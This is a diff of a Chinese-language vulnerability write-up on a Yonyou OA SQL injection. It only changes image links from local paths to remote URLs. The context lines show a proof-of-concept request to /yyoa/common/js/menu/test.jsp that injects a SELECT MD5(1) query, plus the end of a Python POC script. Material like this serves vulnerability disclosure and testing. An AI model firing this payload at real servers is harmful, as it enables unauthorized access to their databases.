@@ -26,7 +26,7 @@
 
 登录页面如下
 
-![](image/yongyou-11.png)
+![](http://wikioss.peiqi.tech/vuln/yongyou-11.png)
 
 POC
 
@@ -34,7 +34,7 @@ POC
 /yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1))
 ```
 
-![](image/yongyou-12.png)
+![](http://wikioss.peiqi.tech/vuln/yongyou-12.png)
 
 利用方法与致远OA 的SQL注入类似
 
@@ -78,4 +78,4 @@ if __name__ == '__main__':
     POC_1(target_url)
 ```
 
-![](image/yongyou-16.png)
+![](http://wikioss.peiqi.tech/vuln/yongyou-16.png)
